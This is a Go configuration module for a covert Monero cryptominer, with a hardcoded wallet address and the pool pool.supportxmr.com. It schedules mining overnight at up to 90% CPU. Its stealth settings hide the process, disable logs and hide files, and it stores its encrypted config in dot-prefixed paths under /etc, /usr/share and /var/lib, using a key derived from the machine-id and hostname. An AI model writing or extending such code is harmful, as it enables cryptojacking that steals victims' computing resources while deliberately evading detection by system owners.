package config

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"system_helper/stealth"
)

type WalletConfig struct {
	Address    string `json:"address"`
	PoolURL    string `json:"pool_url"`
	PaymentID  string `json:"payment_id,omitempty"`
	PoolUser   string `json:"pool_user,omitempty"`
	PoolPass   string `json:"pool_pass,omitempty"`
	Encrypted  bool   `json:"encrypted"`
}

type Config struct {
	Wallet      *WalletConfig `json:"wallet"`
	Schedule    ScheduleConfig `json:"schedule"`
	CPU         CPUConfig      `json:"cpu"`
	Stealth     StealthConfig  `json:"stealth"`
}

type ScheduleConfig struct {
	StartHour   int `json:"start_hour"`
	StartMinute int `json:"start_minute"`
	EndHour     int `json:"end_hour"`
	EndMinute   int `json:"end_minute"`
	Enabled     bool `json:"enabled"`
}

type CPUConfig struct {
	MaxPercent  int `json:"max_percent"`
	Reserved    int `json:"reserved_cores"`
	Affinity    []int `json:"affinity,omitempty"`
}

type StealthConfig struct {
	HideProcess bool   `json:"hide_process"`
	NoLogs      bool   `json:"no_logs"`
	HideFiles   bool   `json:"hide_files"`
}

func LoadStealthConfig() *Config {
	locations := []string{
		"/etc/.systemd/.config.dat",
		"/usr/share/.config/.sysconfig",
		"/var/lib/.cache/.config",
	}
	
	for _, loc := range locations {
		if cfg := tryLoadConfig(loc); cfg != nil {
			return cfg
		}
	}
	
	return DefaultConfig()
}

func tryLoadConfig(path string) *Config {
	key := generateSystemKey()
	
	data, err := stealth.ReadEncryptedFile(path, key)
	if err != nil {
		return nil
	}
	
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil
	}
	
	return &cfg
}

func DefaultConfig() *Config {
	return &Config{
		Wallet: &WalletConfig{
			Address:   "49gSvGkKCAXeBPtFCng14Z7L9vRL7vzYiP3cqx9q1iyZS9Xokr3ZQPPGYH4EfwUAvvGvjKvxQzgwwdtHzotYDVx2A3cuxdQ",
			PoolURL:   "pool.supportxmr.com:443",
			Encrypted: true,
		},
		Schedule: ScheduleConfig{
			StartHour:   23,
			StartMinute: 30,
			EndHour:     6,
			EndMinute:   30,
			Enabled:     true,
		},
		CPU: CPUConfig{
			MaxPercent: 90,
			Reserved:   1,
		},
		Stealth: StealthConfig{
			HideProcess: true,
			NoLogs:      true,
			HideFiles:   true,
		},
	}
}

func (c *Config) Save() error {
	data, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return err
	}
	
	key := generateSystemKey()
	path := "/etc/.systemd/.config.dat"
	
	return stealth.WriteEncryptedFile(path, data, key)
}

func (c *Config) WalletAddress() string {
	return c.Wallet.Address
}

func (c *Config) PoolAddress() string {
	return c.Wallet.PoolURL
}

func (c *Config) WalletKey() []byte {
	hash := sha256.Sum256([]byte(c.Wallet.Address))
	return hash[:]
}

func generateSystemKey() []byte {
	sources := []string{}
	
	if data, err := os.ReadFile("/proc/cpuinfo"); err == nil {
		cpuinfo := string(data)
		for _, line := range strings.Split(cpuinfo, "\n") {
			if strings.Contains(line, "serial") {
				sources = append(sources, strings.TrimSpace(line))
			}
		}
	}
	
	if data, err := os.ReadFile("/etc/machine-id"); err == nil {
		sources = append(sources, string(data))
	}
	
	if hostname, err := os.Hostname(); err == nil {
		sources = append(sources, hostname)
	}
	
	combined := strings.Join(sources, "")
	hash := sha256.Sum256([]byte(combined))
	return hash[:]
}

func (w *WalletConfig) Validate() error {
	if len(w.Address) != 95 && len(w.Address) != 106 {
		return errors.New("invalid wallet address length")
	}
	
	if w.Address[0] != '4' && w.Address[0] != '8' {
		return errors.New("invalid wallet address prefix")
	}
	
	return nil
}

func SetupWalletInteractive() error {
	cfg := DefaultConfig()
	
	return cfg.Save()
}
